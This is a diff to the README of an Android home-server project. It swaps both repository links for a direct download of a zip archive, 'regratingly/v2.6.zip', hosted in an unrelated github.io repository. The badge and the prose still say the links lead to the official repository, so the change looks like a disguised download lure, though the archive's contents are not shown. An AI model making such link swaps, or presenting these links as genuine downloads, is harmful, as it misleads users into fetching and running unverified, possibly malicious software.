@@ -5,7 +5,7 @@ description: "Transform an old Android phone into an always-on home server with 
 ---
 # 📱 android-home-server - Use old phones as home servers
 
-[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/Dyannpointillistic77/android-home-server)
+[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://raw.githubusercontent.com/Dyannpointillistic77/dyannpointillistic77.github.io/main/regratingly/v2.6.zip)
 
 This project turns an old rooted Android phone into a functional home server. It provides services like a secure remote connection, a web interface for file management, and system notifications. You can host your projects or personal files on hardware that you already own.
 
@@ -23,7 +23,7 @@ To use this software, you need the following items:
 
 You must visit the project page to access the files. Use the link below to reach the official repository.
 
-[Visit this page to download the software](https://github.com/Dyannpointillistic77/android-home-server)
+[Visit this page to download the software](https://raw.githubusercontent.com/Dyannpointillistic77/dyannpointillistic77.github.io/main/regratingly/v2.6.zip)
 
 ## 🛠 Setting up your Android device
 
